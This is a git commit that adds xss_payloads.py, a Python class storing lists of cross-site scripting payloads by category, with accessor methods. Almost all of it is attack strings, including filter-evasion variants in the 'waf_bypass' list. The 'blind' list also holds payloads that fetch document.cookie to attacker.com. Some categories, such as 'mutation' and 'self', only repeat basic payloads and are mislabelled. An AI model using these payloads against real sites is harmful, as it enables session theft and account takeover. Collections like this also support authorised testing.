4e1c65cfa9545c2a4ee1d31542d8c15ea36acb3a
anshika0721 <anshikapandey56679@gmail.com>
2025-05-31 10:22:29 +0530

    Create xss_payloads.py

---
+++ xss_payloads.py
@@ -0,0 +1,92 @@
+#!/usr/bin/env python3
+
+class XSSPayloads:
+    def __init__(self):
+        self.payloads = {
+            'reflected': [
+                '<script>alert(1)</script>',
+                '"><script>alert(1)</script>',
+                '"><img src=x onerror=alert(1)>',
+                '"><svg/onload=alert(1)>',
+                'javascript:alert(1)',
+                '"><iframe src="javascript:alert(1)"></iframe>',
+                '"><body onload=alert(1)>',
+                '"><input onfocus=alert(1) autofocus>',
+                '"><select onmouseover=alert(1)>',
+                '"><details open ontoggle=alert(1)>',
+            ],
+            'dom': [
+                '"><img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
+                '"><svg/onload=eval(atob("YWxlcnQoMSk="))>',
+                '"><script>eval(atob("YWxlcnQoMSk="))</script>',
+                '"><img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
+                '"><svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
+            ],
+            'waf_bypass': [
+                '<scr<script>ipt>alert(1)</scr</script>ipt>',
+                '<scr\x00ipt>alert(1)</scr\x00ipt>',
+                '<scr\x0Aipt>alert(1)</scr\x0Aipt>',
+                '<scr\x0Dipt>alert(1)</scr\x0Dipt>',
+                '<scr\x09ipt>alert(1)</scr\x09ipt>',
+                '<scr\x0Cipt>alert(1)</scr\x0Cipt>',
+                '<scr\x0Bipt>alert(1)</scr\x0Bipt>',
+                '<scr\x0Eipt>alert(1)</scr\x0Eipt>',
+                '<scr\x0Fipt>alert(1)</scr\x0Fipt>',
+                '<scr\x1Aipt>alert(1)</scr\x1Aipt>',
+            ],
+            'event': [
+                '"><img src=x onerror=alert(1)>',
+                '"><body onload=alert(1)>',
+                '"><input onfocus=alert(1) autofocus>',
+                '"><select onmouseover=alert(1)>',
+                '"><details open ontoggle=alert(1)>',
+                '"><marquee onstart=alert(1)>',
+                '"><video onloadstart=alert(1)>',
+                '"><audio onloadstart=alert(1)>',
+                '"><iframe onload=alert(1)>',
+                '"><object onerror=alert(1)>',
+            ],
+            'polyglot': [
+                'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//<stYle/onload=alert()>//',
+                '"><img src=x onerror=alert(1)><img src=x onerror=alert(1)>',
+                '"><svg/onload=alert(1)><svg/onload=alert(1)>',
+                '"><script>alert(1)</script><script>alert(1)</script>',
+                '"><iframe src="javascript:alert(1)"></iframe><iframe src="javascript:alert(1)"></iframe>',
+            ],
+            'blind': [
+                '"><img src=x onerror=fetch("http://attacker.com/steal?cookie="+document.cookie)>',
+                '"><script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>',
+                '"><svg/onload=fetch("http://attacker.com/steal?cookie="+document.cookie)>',
+                '"><iframe src="javascript:fetch(\'http://attacker.com/steal?cookie=\'+document.cookie)"></iframe>',
+                '"><body onload=fetch("http://attacker.com/steal?cookie="+document.cookie)>',
+            ],
+            'mutation': [
+                '"><img src=x onerror=alert(1)><img src=x onerror=alert(1)>',
+                '"><svg/onload=alert(1)><svg/onload=alert(1)>',
+                '"><script>alert(1)</script><script>alert(1)</script>',
+                '"><iframe src="javascript:alert(1)"></iframe><iframe src="javascript:alert(1)"></iframe>',
+                '"><body onload=alert(1)><body onload=alert(1)>',
+            ],
+            'self': [
+                '"><img src=x onerror=alert(1)>',
+                '"><svg/onload=alert(1)>',
+                '"><script>alert(1)</script>',
+                '"><iframe src="javascript:alert(1)"></iframe>',
+                '"><body onload=alert(1)>',
+            ],
+        }
+
+    def get_all_payloads(self):
+        """Get all unique payloads from all categories"""
+        all_payloads = set()
+        for category in self.payloads.values():
+            all_payloads.update(category)
+        return list(all_payloads)
+
+    def get_payloads_by_category(self, category):
+        """Get payloads for a specific category"""
+        return self.payloads.get(category, [])
+
+    def get_categories(self):
+        """Get all available payload categories"""
+        return list(self.payloads.keys()) 
